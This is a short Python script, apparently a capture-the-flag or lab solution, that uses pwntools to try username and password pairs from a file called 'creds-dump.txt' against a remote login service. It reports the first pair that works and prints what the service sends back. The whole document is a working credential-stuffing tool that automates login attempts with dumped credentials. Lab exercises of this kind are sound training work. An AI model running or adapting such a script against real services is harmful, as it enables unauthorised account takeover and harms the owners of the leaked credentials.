from pwn import *

with open("creds-dump.txt", "r") as creds:
    for cred in creds:
        user,passwd = cred.strip("\r\n").split(";", 1)
        c = remote("chatelaine.cylabacademy.net", 42737)

        print(f"trying: {user};{passwd}")
        c.sendlineafter(b"Username: ",user.encode())
        c.sendlineafter(b"Password: ",passwd.encode())
        try:
            bad = c.recvuntil(b"Invalid username or password", timeout=3)
            if b"Invalid username or password" in bad:
                c.close()
                continue
        except Exception:
            pass
        print(f"this one: {user};{passwd}")
        response = b""
        response += c.recvrepeat(0.5)
        print(response)
        break